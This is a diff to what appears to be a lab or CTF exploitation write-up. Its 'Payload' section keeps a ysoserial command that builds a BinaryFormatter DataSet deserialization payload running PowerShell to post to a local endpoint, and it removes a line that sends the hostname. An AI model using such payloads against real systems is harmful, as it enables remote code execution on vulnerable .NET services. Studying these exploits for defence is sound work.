@@ -15,10 +15,7 @@ So you're going to deploy it to Azure. Kinda wanted to see if you give it access
 ## Exploitation
 Payload
 
-```powershell
-$p = @{name=hostname};Invoke-WebRequest -Uri http://localhost:7298/api/triggerwarning -Method POST -Body ($p | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
-
-	
+```powershell	
 .\ysoserial.exe -f BinaryFormatter -g DataSet -c "Invoke-WebRequest http://localhost:7298/api/triggerwarning -Method POST -Body "we in here" -ContentType 'application/json' -UseBasicParsing" -t
 ```
 
